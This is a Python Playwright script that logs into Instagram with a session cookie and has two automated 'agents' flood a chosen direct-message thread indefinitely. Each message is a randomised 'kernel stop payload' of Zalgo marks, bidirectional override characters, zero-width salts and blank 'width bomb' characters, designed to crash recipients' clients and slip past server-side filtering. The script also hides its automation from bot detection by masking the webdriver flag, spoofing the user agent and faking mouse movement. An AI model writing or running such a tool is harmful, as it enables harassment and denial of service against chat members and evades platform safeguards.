# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (STABILITY-MAX)
# 📅 STATUS: TIMEOUT-FIXED | DUAL-AGENT | GHOST-PROOF

import os, asyncio, random, sys
from playwright.async_api import async_playwright

def get_kernel_stop_payload():
    """Generates unique Zalgo blocks to bypass server-side drops."""
    u_id = random.randint(100000, 999999)
    salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u2060"], k=20))
    header = f"⚠️ SYSTEM_FAILURE_{u_id}\n{salt}\n"
    
    density = random.randint(40, 70)
    z_tower = "̸" * density
    width_bomb = "\u2800\u00A0" * 25
    
    lines = [header]
    for i in range(70): 
        prefix = "\u202E" if i % 2 == 0 else "\u202D"
        noise = "".join(random.choices("0123456789", k=2))
        lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
    return "\n".join(lines)[:9800]

async def run_agent(agent_id, context, target_id):
    """Event-Driven Agent: Mimics human focus and typing."""
    page = await context.new_page()
    # ✅ Set a global timeout for the whole page to 90 seconds
    page.set_default_navigation_timeout(90000)
    
    try:
        print(f"📡 [A{agent_id}] Synchronizing with Chat...")
        # ✅ FIX: Increased timeout and lighter wait state
        await page.goto(
            f"https://www.instagram.com/direct/t/{target_id}/", 
            wait_until="domcontentloaded", 
            timeout=90000
        )
        
        # 🛠️ NATIVE SELECTOR: Targeting the 'textbox' role
        box = page.get_by_role("textbox", name="Message")
        
        # Wait for the box with its own 60s timeout
        print(f"📡 [A{agent_id}] Scanning for UI Input...")
        await box.wait_for(state="visible", timeout=60000)

        while True:
            payload = get_kernel_stop_payload()
            
            await page.mouse.move(random.randint(100, 500), random.randint(100, 500))
            await box.click()
            
            # ATOMIC FILL: Instant injection
            await box.fill(payload)
            await asyncio.sleep(random.uniform(0.8, 1.5))
            await page.keyboard.press("Enter")
            
            print(f"💀 [A{agent_id}] Strike Delivered.")
            
            # Staggered sleep between agents
            await asyncio.sleep(random.uniform(85, 130))

    except Exception as e:
        print(f"❌ [A{agent_id}] Error: {str(e)[:100]}")
        await page.close()

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=[
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox"
        ])
        
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            viewport={'width': 1920, 'height': 1080}
        )
        
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])

        # 🔥 DUAL-AGENT MATRIX
        await asyncio.gather(
            run_agent(1, context, target_id),
            run_agent(2, context, target_id)
        )

if __name__ == "__main__":
    asyncio.run(main())
